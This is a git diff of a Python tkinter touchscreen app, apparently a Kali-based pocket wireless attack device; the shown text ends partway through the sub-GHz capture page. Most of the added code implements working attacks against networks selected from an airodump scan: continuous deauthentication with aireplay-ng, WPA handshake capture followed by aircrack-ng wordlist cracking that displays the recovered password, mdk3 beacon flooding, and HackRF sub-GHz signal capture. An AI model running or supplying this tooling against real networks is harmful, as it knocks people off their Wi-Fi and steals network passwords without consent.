@@ -7,8 +7,7 @@ import select
 import tkinter as tk
 import tkinter.font as tkFont
 import csv
-from queue import Queue
-
+import queue
 from PIL import Image, ImageTk
 from tkinter import ttk
 from tkinter import messagebox
@@ -19,59 +18,6 @@ unified_fg_color = "#FFFFFF"
 
 
 ###############################################This is the functions space #####################################
-def create_file(freq):
-    directory = "/home/kali/signals"
-    max_files = 9
-    for num in range(1, max_files + 1):
-        filename = f"Signal_{num}_{freq}.complex16s"
-        filepath = os.path.join(directory, filename)
-        # If file does not exist, or we're cycling back to start overwriting
-        if not os.path.exists(filepath) or num == max_files:
-            return filepath
-    # If all files exist and max is reached, start overwriting from the first file
-    return os.path.join(directory, f"Signal_1_{freq}.complex16s")
-
-def receive_signal(output_file, frequency, sample_rate, if_gain, gain, timeout=None):
-    command = [
-        'hackrf_transfer',
-        '-r', output_file,
-        '-f', str(frequency),
-        '-s', str(sample_rate),
-        '-l', str(if_gain),
-        '-g', str(gain)
-    ]
-    try:
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = process.communicate(timeout=3)
-        if process.returncode != 0:
-            print("Error in receive signal:", stderr.decode())
-        else:
-            print("Receive signal success", stdout.decode())
-    except subprocess.TimeoutExpired:
-        print("Receive operation timed out.")
-        process.kill()
-        process.communicate()
-    except Exception:
-        pass
-
-def transmit_signal(input_file, frequency, sample_rate, antenna_gain, tx_gain):
-    command = [
-        'hackrf_transfer',
-        '-t', input_file,
-        '-f', str(frequency),
-        '-s', str(sample_rate),
-        '-a', str(antenna_gain),
-        '-x', str(tx_gain)
-    ]
-    try:
-        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-        stdout, stderr = process.communicate()
-        if process.returncode != 0:
-            print("Error in transmit signal:", stderr.decode())
-        else:
-            print("Transmit signal success")
-    except Exception as e:
-        print(f"An error occurred during transmission: {e}")
 
 
 ###############################################This is the functions space #####################################
@@ -103,7 +49,7 @@ def main_page():
     title_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")
 
     # Create buttons with specified size and font, and center them in the grid
-    wifi_button = tk.Button(content_frame, text="WIFI",
+    wifi_button = tk.Button(content_frame, text="Wi-fi",
                             bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font, command=wifi_page)
     wifi_button.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
 
@@ -111,14 +57,14 @@ def main_page():
                             bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font, command=rfid_page)
     rfid_button.grid(row=1, column=1, padx=10, pady=10, sticky="nsew")
 
-    sub_ghz_button = tk.Button(content_frame, text="SUB-GHz",
+    sub_ghz_button = tk.Button(content_frame, text="Sub-\nGHz",
                                bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font, command=sub_ghz_page)
     sub_ghz_button.grid(row=1, column=2, padx=10, pady=10, sticky="nsew")
 
 def wifi_page():
     # Page and Font Setup.
     new_frame(content_frame)
-    weight_setup(7, 1)
+    weight_setup(5, 1)
     unified_button_font = tkFont.Font(family="Helvetica", size=24, weight="bold")
     unified_title_font = tkFont.Font(family="Helvetica", size=48, weight="bold")
 
@@ -127,8 +73,8 @@ def wifi_page():
     title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
 
     # Create and arrange buttons for different Wi-Fi attack methods
-    button_texts = ["Scan Targets", "Deauthentication Attack", "Password Crack Attempt", "Beacon Frame Flooding", "Evil Twin"]
-    button_commands = [scan_targets, deauth_page, password_crack, beacon_flooding, evil_twin]
+    button_texts = ["Scan Targets", "Beacon Frame Flooding", "Evil Twin"]
+    button_commands = [scan_targets, beacon_frame_flooding_page, evil_twin]
     
     for index, (text, command) in enumerate(zip(button_texts, button_commands)):
         button = tk.Button(content_frame, text=text, font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=command)
@@ -136,8 +82,7 @@ def wifi_page():
 
     # Back button
     return_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=main_page)
-    return_button.grid(row=6, column=0, padx=10, pady=10, sticky="nsew")
-
+    return_button.grid(row=4, column=0, padx=10, pady=10, sticky="nsew")
 def scan_targets():
     """Displays WLAN interfaces as selectable buttons and navigates to the scanning page."""
     new_frame(content_frame)
@@ -159,9 +104,22 @@ def scan_targets():
                                      command=lambda iface=interface: on_interface_button_click(iface))
         interface_button.grid(row=index, column=0, padx=10, pady=10, sticky="nsew")
 
+    # Remove Last Scan File button
+    remove_file_button = tk.Button(content_frame, text="Remove Last Scan File", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda: remove_last_scan_file(remove_file_button))
+    remove_file_button.grid(row=len(interfaces) + 1, column=0, padx=10, pady=10, sticky="nsew")
+
     # Back button
     return_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=wifi_page)
-    return_button.grid(row=len(interfaces) + 1, column=0, padx=10, pady=10, sticky="nsew")
+    return_button.grid(row=len(interfaces) + 2, column=0, padx=10, pady=10, sticky="nsew")
+
+def remove_last_scan_file(remove_file_button):
+    """Removes the last scan file."""
+    try:
+        subprocess.run(["sudo", "rm", "/tmp/airodump_output-01.csv", "/tmp/handshake_output-01.cap", "/tmp/password.txt"], check=True)
+    except:
+        pass
+    finally:
+        remove_file_button.config(text='Removed Successfully')
 
 
 # Global variable to hold the selected monitor mode interface
@@ -195,7 +153,7 @@ def set_monitor_mode(interface):
         print(f"Error enabling monitor mode: {e}")
         return None
 
-
+scanning_process = None
 def scanning():
     """Set up the scanning page, start airodump-ng in a thread, and display scanning status."""
     global scanning_process, scanning_output_label
@@ -210,7 +168,7 @@ def scanning():
     scanning_output_label = tk.Label(content_frame, text="Scanning in progress...", bg=unified_bg_color, fg=unified_fg_color, font=tkFont.Font(size=18))
     scanning_output_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
 
-    stop_scanning_button = tk.Button(content_frame, text="Stop Scanning", font=tkFont.Font(size=24), bg=unified_bg_color, fg=unified_fg_color, command=stop_scanning)
+    stop_scanning_button = tk.Button(content_frame, text="Stop Scanning", font=tkFont.Font(size=24), bg=unified_bg_color, fg=unified_fg_color, command=wifi_stop_scanning)
     stop_scanning_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")
 
     # Start the airodump-ng command in a separate thread to avoid blocking the GUI
@@ -223,7 +181,7 @@ def run_airodump(interface):
     command = ['sudo', 'airodump-ng', interface, '-w', '/tmp/airodump_output', '--output-format', 'csv']
     scanning_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
 
-def stop_scanning():
+def wifi_stop_scanning():
     global scanning_process  # Make sure to access the global variable
     if scanning_process:
         scanning_process.terminate()  # This sends SIGTERM, you could also send SIGINT if needed
@@ -246,13 +204,13 @@ def results_page():
     results = read_csv_results('/tmp/airodump_output-01.csv')
     
     # Limit to 20 entries and create buttons in a 4x5 grid
-    for index, (bssid, essid) in enumerate(results[:20]):
+    for index, (bssid, essid, channel, encryption) in enumerate(results[:20]):
         # Determine row and column positions based on index
         row_position = index // 5 + 1  # Starts at 1 since the title is at row 0
         column_position = index % 5
         
-        button_text = f"Target {index + 1}: {essid or 'N/A'} ({bssid})"
-        result_button = tk.Button(content_frame, text=button_text, font=small_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda b=bssid, e=essid: choose_attack_page(b, e))
+        button_text = f"{essid or 'N/A'} \n({bssid})"
+        result_button = tk.Button(content_frame, text=button_text, font=small_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption: choose_attack_page(bssid, essid, channel, encryption))
         result_button.grid(row=row_position, column=column_position, padx=5, pady=5, sticky="nsew")
     
     # Add a back button spanning all columns
@@ -277,93 +235,295 @@ def read_csv_results(file_path):
 
         if len(fields) >= 13:
             bssid = fields[0].strip()
+            channel = fields[3].strip()
+            encryption = fields[5].strip()
             essid = fields[13].strip()
-            results.append((bssid, essid))
+            results.append((bssid, essid, channel, encryption))
 
     return results
 
-def choose_attack_page(bssid, essid):
+def choose_attack_page(bssid, essid, channel, encryption):
     """Display a page to choose an attack type for the given target."""
     new_frame(content_frame)
     weight_setup(4, 1)  # Adjust grid weights
     unified_title_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
-    unified_button_font = tkFont.Font(family="Helvetica", size=24, weight="bold")
+    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")
 
     # Title label showing the target information
-    title_text = f"Choose Attack for {essid or 'N/A'} ({bssid})"
-    title_label = tk.Label(content_frame, text=title_text, bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
+    title_text = f"Choose Attack for {essid or 'N/A'}\n({bssid})\nChannel ({channel})\nEnc ({encryption})"
+    title_label = tk.Label(content_frame, text=title_text, bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font)
     title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
 
     # Deauthentication attack button
-    deauth_button = tk.Button(content_frame, text="Deauthentication Attack", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color)
+    deauth_button = tk.Button(content_frame, text="Deauthentication Attack", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption:  deauth_page(bssid,essid,channel,encryption))
     deauth_button.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
 
     # Password cracking attack button
-    crack_button = tk.Button(content_frame, text="Password Cracking Attack", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color)
+    crack_button = tk.Button(content_frame, text="Password Cracking Attack", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption:  password_crack_page(bssid,essid,channel,encryption))
     crack_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")
 
     # Back button to return to results page
     back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=results_page)
     back_button.grid(row=3, column=0, padx=10, pady=10, sticky="nsew")
-def deauth_page():
-    # Page and Font Setup.
+deauth_process = None
+def set_channel(interface, channel):
+    """Set the wireless interface to a specific channel."""
+    try:
+        # Setting the channel using iwconfig
+        subprocess.run(['sudo', 'iwconfig', interface, 'channel', str(channel)], check=True)
+        print(f"Channel set to {channel} on {interface}.")
+    except subprocess.CalledProcessError as e:
+        print(f"Failed to set channel: {e}")
+
+
+def deauth_page(bssid, essid, channel, encryption):
+    """Display the deauthentication attack page and execute the attack."""
     new_frame(content_frame)
-    weight_setup(4, 1)
-    unified_button_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
-    unified_title_font = tkFont.Font(family="Helvetica", size=48, weight="bold")
-    
+    weight_setup(4, 1)  # Adjust grid weights
+    unified_title_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
+    unified_button_font = tkFont.Font(family="Helvetica", size=24, weight="bold")
+
     # Title label
-    title_label = tk.Label(content_frame, text="Select a Target", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
+    title_label = tk.Label(content_frame, text="Deauthentication Attack", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
     title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
 
-    # Text box to display targets
-    text_font = tkFont.Font(family="Helvetica", size=16)
-    text_box = tk.Text(content_frame, font=text_font, height=10, width=50, bg=unified_bg_color, fg=unified_fg_color)
-    text_box.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
-    text_box.insert(tk.END, "Target 1: Example Network\nTarget 2: Another Network\nTarget 3: More Networks\n")  # Example targets
+    # ESSID and BSSID labels
+    essid_label = tk.Label(content_frame, text=f"ESSID: {essid or 'N/A'}\n({bssid})\nChannel ({channel})\nEnc ({encryption})", bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font)
+    essid_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
 
-    # Entry box for number input
-    entry_font = tkFont.Font(family="Helvetica", size=20)
-    number_entry = tk.Entry(content_frame, font=entry_font, justify='center',  bg=unified_bg_color, fg=unified_fg_color)
-    number_entry.grid(row=3, column=0, padx=10, pady=10, sticky="nsew")
+    # Execute button
+    execute_button = tk.Button(content_frame, text="Execute", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
+                               command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption: deauth(bssid, essid, channel, encryption, execute_button))
+    execute_button.grid(row=3, column=0, padx=10, pady=10, sticky="nsew")
 
-    # Number pad buttons
-    pad_frame = tk.Frame(content_frame, bg=unified_bg_color)
-    pad_frame.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")
-    btn_texts = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "Clear"]
-    r = 0
-    c = 0
-    for btn_text in btn_texts:
-        button = tk.Button(pad_frame, text=btn_text, font=entry_font, bg=unified_bg_color, fg=unified_fg_color,
-                           command=lambda b=btn_text: number_pad_action(b, number_entry))
-        button.grid(row=r, column=c, padx=5, pady=5, sticky="nsew")
-        c += 1
-        if c > 2:
-            c = 0
-            r += 1
-
-    # Configure pad_frame grid weights
-    for i in range(4):
-        pad_frame.grid_rowconfigure(i, weight=1)
-    for i in range(3):
-        pad_frame.grid_columnconfigure(i, weight=1)
-
-    # Back button
-    
-    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=wifi_page)
+    # Back button to return to the choose_attack_page
+    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, 
+                            command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption: choose_attack_page(bssid, essid, channel, encryption))
     back_button.grid(row=4, column=0, padx=10, pady=10, sticky="nsew")
 
-def number_pad_action(value, entry_widget):
-    if value == "Clear":
-        entry_widget.delete(0, tk.END)
-    else:
-        entry_widget.insert(tk.END, value)
+    threading.Thread(target=set_channel, args=(monitor_interface, channel)).start()
 
-def password_crack():
-    print("Attempting password crack...")  # Placeholder for actual function
 
-def beacon_flooding():
-    print("Flooding with beacon frames...")  # Placeholder for actual function
+def deauth(bssid, essid, channel, encryption, execute_button):
+    """Conduct the deauthentication attack using aireplay-ng."""
+    global deauth_process
+    # Update button to show "Stop Execution" and link it to the stop_deauth function
+    execute_button.config(text="Stop Execution...", command=lambda: stop_deauth(execute_button))
+
+    # Command to continuously send deauth packets
+    command = ['sudo', 'aireplay-ng', '-0', '0', '-a', bssid, monitor_interface]
+
+    # Start the aireplay-ng command as a subprocess
+    deauth_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+def stop_deauth(execute_button):
+    global deauth_process  # Make sure to access the global variable
+    if deauth_process:
+        deauth_process.terminate()  # This sends SIGTERM, you could also send SIGINT if needed
+        deauth_process.wait()       # Wait for the process to terminate
+        deauth_process = None       # Reset the global variable
+    # Update the button to show it's stopped and reset the command to start deauth again
+    execute_button.config(text="Terminated")
+
+
+# def test(target_info_label,execute_button):
+#     thread = threading.Thread(target=testt, args=(monitor_interface, target_info_label))
+#     thread.start()
+#     execute_button.config(text='stop', command=lambda: stoop(execute_button))
+
+# def testt(interface, target_info_label):
+#     global scanning_process
+#     command = ['sudo', 'airodump-ng', interface]
+#     scanning_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+#     texts = ''
+#     for line in scanning_process.stdout.read():
+#         texts += line.decode()
+#         target_info_label.config(text=texts)
+
+# def stoop(execute_button):
+#     global scanning_process  # Make sure to access the global variable
+#     if scanning_process:
+#         scanning_process.terminate()  # This sends SIGTERM, you could also send SIGINT if needed
+#         scanning_process.wait()       # Wait for the process to terminate
+#         scanning_process = None       # Reset the global variable
+#     # Update the button to show it's stopped and reset the command to start deauth again
+#     execute_button.config(text="Terminated")
+
+crack_deauth = None
+crack_airodump = None
+crack_aircrack = None
+def password_crack_page(bssid, essid, channel, encryption):
+    """Display the password cracking attack page."""
+    new_frame(content_frame)
+    weight_setup(4, 1)
+    unified_title_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
+    unified_button_font = tkFont.Font(family="Helvetica", size=24, weight="bold")
+
+    # Title label
+    title_label = tk.Label(content_frame, text="Password Crack Attack", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
+    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
+
+    # Target information label
+    target_info_label = tk.Label(content_frame, text=f"BSSID: {bssid}\nESSID: {essid or 'N/A'}\nChannel: {channel}\nEncryption: {encryption}",
+                                 bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font)
+    target_info_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
+
+    # Execute button
+    execute_button = tk.Button(content_frame, text="Execute", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
+                               command=lambda bssid=bssid, essid=essid, channel=channel, encryption=encryption: start_password_cracking(bssid, essid, channel, encryption, execute_button, target_info_label))
+    execute_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")
+
+    # Back button
+    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=lambda: choose_attack_page(bssid,essid,channel,encryption))
+    back_button.grid(row=3, column=0, padx=10, pady=10, sticky="nsew")
+
+    # Set channel
+    threading.Thread(target=set_channel, args=(monitor_interface, channel)).start()
+
+
+def start_password_cracking(bssid, essid, channel, encryption, execute_button, target_info_label):
+    """Start the processes for capturing a handshake and initiating a de-auth attack in separate threads."""
+    global crack_airodump, crack_deauth
+    execute_button.config(text="Deauthing and Listening for Handhsake (Terminate)", command=lambda: stop_password_cracking(bssid, essid, channel, encryption, execute_button, target_info_label))
+
+    def crack_run_airodump():
+        # Command to run airodump-ng to capture handshakes
+        airodump_command = ['sudo', 'airodump-ng', '-c', channel, '--bssid', bssid, '-w', '/tmp/handshake_output', '--output-format', 'cap', monitor_interface]
+        global crack_airodump
+        crack_airodump = subprocess.Popen(airodump_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+    def crack_run_aireplay():
+        # Command to continuously send deauth packets
+        aireplay_command = ['sudo', 'aireplay-ng', '-0', '3', '-a', bssid, monitor_interface]
+        global crack_deauth
+        crack_deauth = subprocess.Popen(aireplay_command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+    # Start both processes in separate threads
+    threading.Thread(target=crack_run_airodump, daemon=True).start()
+    threading.Thread(target=crack_run_aireplay, daemon=True).start()
+
+def stop_password_cracking(bssid, essid, channel, encryption, execute_button, target_info_label):
+    """Stop the airodump and aireplay processes."""
+    global crack_airodump, crack_deauth, crack_aircrack
+    if crack_airodump:
+        crack_airodump.terminate()
+        crack_airodump.wait()
+        crack_airodump = None
+    if crack_deauth:
+        crack_deauth.terminate()
+        crack_deauth.wait()
+        crack_deauth = None
+
+    # Reset the button text and functionality to allow re-execution
+    execute_button.config(text="Handshake Captured. Crack Password", command=lambda: crack_password(bssid, essid, channel, encryption, execute_button, target_info_label))
+
+def crack_password(bssid, essid, channel, encryption, execute_button, target_info_label):
+    """Run aircrack-ng on the captured handshake file."""
+    global crack_aircrack
+    cap_file = '/tmp/handshake_output-01.cap'  # Assuming default airodump-ng output filename format
+    command = ['sudo', 'aircrack-ng', '-b', bssid, '-w', '/home/kali/Wifi/wordlist/rockme.txt', '-l', '/tmp/password.txt', cap_file]
+
+    # Command to continuously send deauth packets
+    crack_aircrack = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+    # Reset the execute button to start the process again or change to a different task
+    execute_button.config(text="Cracking .. (Terminate)", command=lambda: stop_cracking_process(bssid, essid, channel, encryption, execute_button, target_info_label))
+
+def stop_cracking_process(bssid, essid, channel, encryption, execute_button, target_info_label):
+    global crack_aircrack
+    if crack_aircrack: 
+        crack_aircrack.terminate()
+        crack_aircrack.wait()
+        crack_aircrack = None
+    execute_button.config(text="Cracking  stopped. Read contents", command=lambda: read_password(bssid, essid, channel, encryption, execute_button, target_info_label))
+
+def read_password(bssid, essid, channel, encryption, execute_button, target_info_label):
+    """
+    Reads the contents of a password file and updates the GUI label with the contents.
+    """
+    try:
+        with open("/tmp/password.txt", "r") as file:
+            result = file.read()  # Read all contents of the file
+        target_info_label.config(text=result)  # Update the label with the contents of the file
+        execute_button.config(text="Read Complete")  # Update the button text after reading
+    except Exception as e:
+        target_info_label.config(text="Failed to read file: " + str(e))  # Show error if read fails
+        execute_button.config(text="Read Failed")  # Update the button text to
+
+
+beacon_process = None
+
+def beacon_frame_flooding_page():
+    """Display the page for selecting the beacon frame flooding attack intensity."""
+    new_frame(content_frame)
+    weight_setup(4, 3)  # Adjust grid weights for 2 rows and 3 columns
+
+    unified_title_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
+    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")
+
+    # Title label
+    title_label = tk.Label(content_frame, text="Select Beacon Attack Intensity", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
+    title_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")
+
+    # Generate buttons for each beacon list
+    for i in range(6):
+        num_beacons = 5 * (i + 1)
+        list_path = f"/device/wifi/beaconslist/{num_beacons}_beacons"
+        button = tk.Button(content_frame, text=f"{num_beacons} Beacons", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
+                           command=lambda lp=list_path, nb=num_beacons: execute_beacon_attack(lp, nb))
+        row_idx = i // 3 + 1  # Starts from row 1 because row 0 is the title
+        col_idx = i % 3
+        button.grid(row=row_idx, column=col_idx, padx=10, pady=10, sticky="nsew")
+
+    # Back button to return to main WiFi page
+    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=wifi_page)
+    back_button.grid(row=3, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")
+
+def execute_beacon_attack(list_path, num_beacons):
+    """Display the page for executing the beacon frame flooding attack."""
+    new_frame(content_frame)
+    weight_setup(4, 1)  # Adjust grid weights for simplicity
+    unified_title_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
+    unified_button_font = tkFont.Font(family="Helvetica", size=24, weight="bold")
+
+    # Title label
+    title_label = tk.Label(content_frame, text="Beacon Attack", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
+    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
+
+    # Beacon count label
+    beacon_count_label = tk.Label(content_frame, text=f"The number of beacons: {num_beacons}", bg=unified_bg_color, fg=unified_fg_color, font=unified_button_font)
+    beacon_count_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
+
+    # Execute button
+    execute_button = tk.Button(content_frame, text="Execute", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
+                               command=lambda: beacon_attack(list_path, execute_button))
+    execute_button.grid(row=2, column=0, padx=10, pady=10, sticky="nsew")
+
+    # Back button
+    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=beacon_frame_flooding_page)
+    back_button.grid(row=3, column=0, padx=10, pady=10, sticky="nsew")
+
+def beacon_attack(list_path, execute_button):
+    """Execute the beacon frame flooding attack using mdk3 and allow for stopping."""
+    global beacon_process
+    execute_button.config(text="Stop Executing", command=lambda: stop_beacon_attack(execute_button))
+
+    # Command to continuously send beacon frames
+    command = ['sudo', 'mdk3', monitor_interface, 'b', '-a', '-w', '-m', '-s', '100', '-f', list_path]
+
+    # Start the mdk3 command as a subprocess
+    beacon_process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+
+def stop_beacon_attack(execute_button):
+    global beacon_process
+    if beacon_process:
+        beacon_process.terminate()  # This sends SIGTERM, you could
+        beacon_process.wait()
+        beacon_process = None
+
+    execute_button.config(text="Terminated. Go back to beacon page", command=beacon_frame_flooding_page)
+
+
 
 def evil_twin():
     print("Setting up Evil Twin...")  # Placeholder for actual function
@@ -396,25 +556,43 @@ def read_card():
 def write_card():
     new_frame(content_frame)
 
+freq_entry = None
+capturing_process= None
+transmitting_process= None
 def sub_ghz_page():
-    # Page and Font Setup.
     new_frame(content_frame)
-    weight_setup(8,3)
-    unified_button_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
-    unified_title_font = tkFont.Font(family="Helvetica", size=48, weight="bold")
-
-    # Title label
-    title_label = tk.Label(content_frame, text="Please Specify the Frequency: ", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
-    title_label.grid(row=0, column=0, columnspan=2, padx=10, pady=10, sticky="nsew")
-
-
-    # Create a font object for dynamic scaling
-    # Adjust size as needed
-    entry_font = tkFont.Font(family="Helvetica", size=40, weight="bold")  # For the entry widget
-
-    # Frequency entry at the top
+    weight_setup(4, 1)  # Three rows, one column
     global freq_entry
-    freq_entry = tk.Entry(content_frame, width=10, font=entry_font, bg=unified_bg_color, fg=unified_fg_color)
+    
+    unified_button_font = tkFont.Font(family="Helvetica", size=25, weight="bold")
+    
+    title_label = tk.Label(content_frame, text="Stubby Subby:", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color)
+    title_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")
+    # Capture button
+    capture_button = tk.Button(content_frame, text="Capture", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=capture_sub_ghz)
+    capture_button.grid(row=1, column=0, padx=10, pady=10, sticky='nsew')
+    
+    # Transmit button
+    transmit_button = tk.Button(content_frame, text="Transmit", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=transmit_sub_ghz)
+    transmit_button.grid(row=2, column=0, padx=10, pady=10, sticky='nsew')
+    
+    # Back button
+    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=main_page)
+    back_button.grid(row=3, column=0, padx=10, pady=10, sticky='nsew')
+
+def capture_sub_ghz():
+    new_frame(content_frame)
+    weight_setup(7, 3)  # Five rows, three columns for the number pad and other controls
+    global freq_entry
+
+    
+    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")
+    unified_title_font = tkFont.Font(family="Helvetica", size=30, weight="bold")
+    
+    title_label = tk.Label(content_frame, text="Enter Frequency to Capture:", font=unified_title_font, bg=unified_bg_color, fg=unified_fg_color)
+    title_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")
+
+    freq_entry = tk.Entry(content_frame, width=10, font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color)
     freq_entry.grid(row=0, column=2, pady=10, sticky='nsew')
     freq_entry.config(justify="center")  # Center horizontally
 
@@ -432,62 +610,75 @@ def sub_ghz_page():
         btn = tk.Button(content_frame, text=text, font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=command)
         btn.grid(row=r + 1, column=c, padx=10, pady=10, sticky='nsew')
 
-    # Capture and Transmit buttons below the number pad
-    capture_button = tk.Button(content_frame, text="Capture", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=capture_sub_ghz)
-    capture_button.grid(row=5, column=0, columnspan=3, pady=10, sticky='nsew')
-    transmit_button = tk.Button(content_frame, text="Transmit", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=transmit_sub_ghz)
-    transmit_button.grid(row=6, column=0, columnspan=3, pady=10, sticky='nsew')
+    execute_button = tk.Button(content_frame, text="Execute", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color,
+                               command=lambda: capturing_page(freq_entry.get(), execute_button))
+    execute_button.grid(row=5, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")
 
     # Back button
-    return_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=main_page)
-    return_button.grid(row=7, column=0, columnspan=3, pady=10, sticky='nsew')
+    back_button = tk.Button(content_frame, text="Back", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color, command=sub_ghz_page)
+    back_button.grid(row=6, column=0, columnspan=3, padx=10, pady=10, sticky='nsew')
 
-def add_to_freq(char):
-    freq_entry.insert(tk.END, char)
-
-def clear_freq():
-    freq_entry.delete(0, tk.END)
-
-def new_frame(frame):
-    # Clears all widgets from the given frame
-    for widget in frame.winfo_children():
-        widget.destroy()
-
-#Implement getting the pid of the hackrf_transfer and killing it once u press back.
-def capture_sub_ghz():
+def capturing_page(freq, execute_button):
+    new_frame(content_frame)
+    weight_setup(4,1)  # Five rows, three columns for the number pad and other controls
     global freq_entry
-    if freq_entry is not None:
-        freq = freq_entry.get()
-        
-        # Page and Font Setup.
-        new_frame(content_frame)
-        weight_setup(3,3)
-        unified_button_font = tkFont.Font(family="Helvetica", size=36, weight="bold")
-        unified_title_font = tkFont.Font(family="Helvetica", size=48, weight="bold")
 
-        # Title label
-        title_label = tk.Label(content_frame, text="Listening to Sub-GHz Frequency", bg=unified_bg_color, fg=unified_fg_color, font=unified_title_font)
-        title_label.grid(row=0, column=0, columnspan=3, padx=10, pady=10, sticky="nsew")
+    
+    unified_button_font = tkFont.Font(family="Helvetica", size=20, weight="bold")
+    unified_title_font = tkFont.Font(family="Helvetica", size=30, weight="bold")
+    
+    title_label = tk.Label(content_frame, text="Capture an RF Signal", font=unified_title_font, bg=unified_bg_color, fg=unified_fg_color)
+    title_label.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
+    
+    info_label = tk.Label(content_frame, text=f"Listening on {freq}MHz...", font=unified_button_font, bg=unified_bg_color, fg=unified_fg_color)
+    info_label.grid(row=1, column=0, padx=10, pady=10, sticky="nsew")
 
-        # Message label
-        message_font = tkFont.Font(family="Helvetica", size=24, weight="normal")
